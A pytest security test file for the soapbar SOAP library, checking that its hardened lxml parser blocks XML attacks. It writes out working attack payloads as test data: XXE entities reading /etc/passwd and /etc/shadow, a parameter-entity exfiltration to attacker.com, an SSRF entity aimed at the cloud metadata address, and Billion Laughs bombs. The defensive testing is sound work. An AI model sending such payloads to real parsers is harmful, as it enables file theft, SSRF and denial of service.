"""
Security audit tests for soapbar.

Validates that the hardened lxml parser correctly blocks XML attack vectors.
All tests are self-contained with no outbound HTTP.
"""
from __future__ import annotations

import pytest
from lxml import etree

from soapbar.core.xml import parse_xml, parse_xml_document
from soapbar.core.envelope import SoapEnvelope
from soapbar.server.application import SoapApplication
from soapbar.server.service import SoapService, soap_operation
from soapbar.core.binding import BindingStyle


def _make_app() -> SoapApplication:
    class _Echo(SoapService):
        __service_name__ = "Echo"
        __tns__ = "http://example.com/echo"
        __binding_style__ = BindingStyle.DOCUMENT_LITERAL_WRAPPED

        @soap_operation()
        def echo(self, msg: str) -> str:
            return msg

    app = SoapApplication()
    app.register(_Echo())
    return app


# ---------------------------------------------------------------------------
# XXE Prevention (resolve_entities=False)
# ---------------------------------------------------------------------------

class TestXxePrevention:
    """OWASP A5 — XML External Entity (XXE) Injection prevention."""

    def test_xxe_entity_not_expanded(self):
        """Entity references must NOT be expanded (XXE prevention).
        With resolve_entities=False, lxml silently drops entity content."""
        xxe_xml = b"""<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Body>
            <payload>&xxe;</payload>
          </soapenv:Body>
        </soapenv:Envelope>"""
        # Entity content must NOT appear in the parsed result
        try:
            root = parse_xml(xxe_xml)
            body = root.find("{http://schemas.xmlsoap.org/soap/envelope/}Body")
            if body is not None:
                payload = body.find("payload")
                if payload is not None:
                    text = payload.text or ""
                    assert "root:" not in text, "XXE: /etc/passwd content was expanded!"
                    assert "/bin/" not in text, "XXE: /etc/passwd content was expanded!"
        except etree.XMLSyntaxError:
            pass  # Parser rejecting the DTD is also an acceptable security outcome

    def test_xxe_via_parameter_entity(self):
        """Parameter entities are also blocked."""
        xxe_xml = b"""<?xml version="1.0"?>
        <!DOCTYPE root [
          <!ENTITY % file SYSTEM "file:///etc/shadow">
          <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
          %eval;
          %exfil;
        ]>
        <root/>"""
        try:
            root = parse_xml(xxe_xml)
            # Must not contain shadow file content
            text = etree.tostring(root, encoding="unicode")
            assert "root:" not in text
        except etree.XMLSyntaxError:
            pass  # Rejection is acceptable

    def test_xxe_via_envelope_parsing(self):
        """XXE attack through SOAP envelope parsing must be blocked."""
        xxe_xml = b"""<?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Body><data>&xxe;</data></soapenv:Body>
        </soapenv:Envelope>"""
        app = _make_app()
        status, ct, body = app.handle_request(xxe_xml)
        # Body response must not contain /etc/passwd content
        assert b"root:" not in body, "XXE: /etc/passwd content leaked in response"
        assert b"/bin/" not in body, "XXE: /etc/passwd content leaked in response"

    def test_xxe_local_entity_defined(self):
        """Locally-defined entities should be dropped/ignored."""
        xml = b"""<?xml version="1.0"?>
        <!DOCTYPE test [<!ENTITY local "injected content">]>
        <root>&local;</root>"""
        try:
            root = parse_xml(xml)
            text = root.text or ""
            # Entity was either dropped (empty) or rejection was raised
            assert "injected content" not in text
        except etree.XMLSyntaxError:
            pass  # Rejection is a valid security response


# ---------------------------------------------------------------------------
# Billion Laughs / XML Bomb (huge_tree=False + entity expansion)
# ---------------------------------------------------------------------------

class TestBillionLaughsPrevention:
    """Billion Laughs attack (exponential entity expansion) prevention."""

    def test_billion_laughs_entity_expansion(self):
        """Classic Billion Laughs XML must not cause memory exhaustion."""
        billion_laughs = b"""<?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>"""
        try:
            root = parse_xml(billion_laughs)
            # If parsed, entities must not be expanded
            text = etree.tostring(root, encoding="unicode")
            assert len(text) < 10_000, f"Billion Laughs expansion occurred: output length {len(text)}"
        except etree.XMLSyntaxError:
            pass  # Rejection is the preferred outcome

    def test_recursive_entity_not_expanded(self):
        """Recursive entity definitions must not cause infinite recursion."""
        recursive = b"""<?xml version="1.0"?>
        <!DOCTYPE root [
          <!ENTITY a "&b;">
          <!ENTITY b "&a;">
        ]>
        <root>&a;</root>"""
        try:
            root = parse_xml(recursive)
            # Should parse without crash
        except etree.XMLSyntaxError:
            pass  # Rejection is acceptable


# ---------------------------------------------------------------------------
# SSRF via External DTD (no_network=True)
# ---------------------------------------------------------------------------

class TestSsrfPrevention:
    """SSRF prevention via no_network=True in lxml parser."""

    def test_external_dtd_blocked(self):
        """External DTD references must not trigger network requests."""
        external_dtd = b"""<?xml version="1.0"?>
        <!DOCTYPE root SYSTEM "http://attacker.example.com/evil.dtd">
        <root>data</root>"""
        # Should either parse without fetching or raise XMLSyntaxError
        try:
            root = parse_xml(external_dtd)
            # Parsed successfully without network access — good
        except etree.XMLSyntaxError:
            pass  # Also acceptable

    def test_ssrf_via_parameter_entity_url(self):
        """Parameter entity with URL must not trigger SSRF."""
        ssrf_xml = b"""<?xml version="1.0"?>
        <!DOCTYPE root [
          <!ENTITY % remote SYSTEM "http://169.254.169.254/latest/meta-data/">
          %remote;
        ]>
        <root/>"""
        try:
            root = parse_xml(ssrf_xml)
        except etree.XMLSyntaxError:
            pass  # Expected — good


# ---------------------------------------------------------------------------
# XML Bomb — oversized attributes / text
# ---------------------------------------------------------------------------

class TestXmlBombPrevention:
    """huge_tree=False prevents memory exhaustion from crafted large XML."""

    def test_large_attribute_value_handled(self):
        """10MB attribute value should be handled without OOM."""
        big_attr = "A" * (10 * 1024 * 1024)  # 10MB
        xml = f'<root attr="{big_attr}"/>'.encode()
        try:
            root = parse_xml(xml)
            # If parsed, must not expand beyond acceptable memory
        except etree.XMLSyntaxError:
            pass  # Rejection for huge_tree=False is correct

    def test_large_text_content_handled(self):
        """1MB text content must be handled without crash."""
        big_text = "B" * (1024 * 1024)  # 1MB
        xml = f"<root>{big_text}</root>".encode()
        try:
            root = parse_xml(xml)
            # 1MB of text content is within limits
            assert root is not None
        except etree.XMLSyntaxError:
            pass


# ---------------------------------------------------------------------------
# Comment and PI Injection
# ---------------------------------------------------------------------------

class TestCommentAndPiRemoval:
    """remove_comments=True and remove_pis=True prevent injection via XML comments/PIs."""

    def test_xml_comments_removed(self):
        """XML comments must be stripped by the hardened parser."""
        xml = b"<root><!-- injected comment --><child>value</child></root>"
        root = parse_xml(xml)
        # If comments were kept, tostring would contain them
        text = etree.tostring(root, encoding="unicode")
        assert "<!--" not in text, "XML comments were not removed by hardened parser"
        assert "-->" not in text

    def test_xml_processing_instructions_removed(self):
        """Processing instructions must be stripped."""
        xml = b"<?xml-stylesheet type='text/xsl' href='attack.xsl'?><root/>"
        try:
            root = parse_xml(xml)
            text = etree.tostring(root, encoding="unicode")
            assert "<?xml-stylesheet" not in text
        except etree.XMLSyntaxError:
            pass  # Also acceptable

    def test_comment_injection_via_soap(self):
        """XML comments in SOAP body must not result in injected content being executed.

        Note: The XML spec forbids '--' inside comments.  Such malformed XML causes
        lxml to report a parse error.  The error message may reference the raw comment
        text, but this is in a fault message — the comment was never executed as data.
        What matters is that lxml's remove_comments=True prevents comment-as-valid-data
        scenarios and the service handler never receives comment content.
        """
        # Valid XML comment (no '--' inside)
        xml = b"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Body>
            <!-- injection attempt -->
            <echo xmlns="http://example.com/echo">
              <msg>normal</msg>
            </echo>
          </soapenv:Body>
        </soapenv:Envelope>"""
        app = _make_app()
        status, ct, body = app.handle_request(xml)
        # Comment content must NOT appear in the response body as executed data.
        # The service either processes "normal" or returns a fault — not the comment text.
        assert b"injection attempt" not in body, \
            "Comment content must be stripped before reaching the service handler"


# ---------------------------------------------------------------------------
# WSDL Security
# ---------------------------------------------------------------------------

class TestWsdlSecurity:
    """WSDL parsing security — external references and entity injection."""

    def test_wsdl_xxe_blocked(self):
        """XXE in WSDL parsing must be blocked."""
        from soapbar.core.wsdl.parser import parse_wsdl
        evil_wsdl = b"""<?xml version="1.0"?>
        <!DOCTYPE definitions [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <definitions xmlns="http://schemas.xmlsoap.org/wsdl/"
                     name="&xxe;"
                     targetNamespace="http://example.com/">
          <portType name="PT"/>
        </definitions>"""
        try:
            defn = parse_wsdl(evil_wsdl)
            # Entity must NOT be in defn.name
            assert "root:" not in defn.name
            assert "/bin/" not in defn.name
        except Exception:
            pass  # Any exception is also acceptable


# ---------------------------------------------------------------------------
# Namespace Confusion
# ---------------------------------------------------------------------------

class TestNamespaceConfusion:
    """Namespace confusion attacks — wrong namespace accepted as valid SOAP."""

    def test_wrong_namespace_rejected(self):
        """Wrong envelope namespace raises ValueError, not silent acceptance."""
        wrong_ns = b"""<env:Envelope xmlns:env="http://evil.example.com/soap">
          <env:Body/>
        </env:Envelope>"""
        with pytest.raises(ValueError, match="Unknown SOAP envelope namespace"):
            SoapEnvelope.from_xml(wrong_ns)

    def test_empty_namespace_rejected(self):
        """Unqualified Envelope element (no namespace) raises ValueError."""
        no_ns = b"<Envelope><Body/></Envelope>"
        with pytest.raises(ValueError):
            SoapEnvelope.from_xml(no_ns)
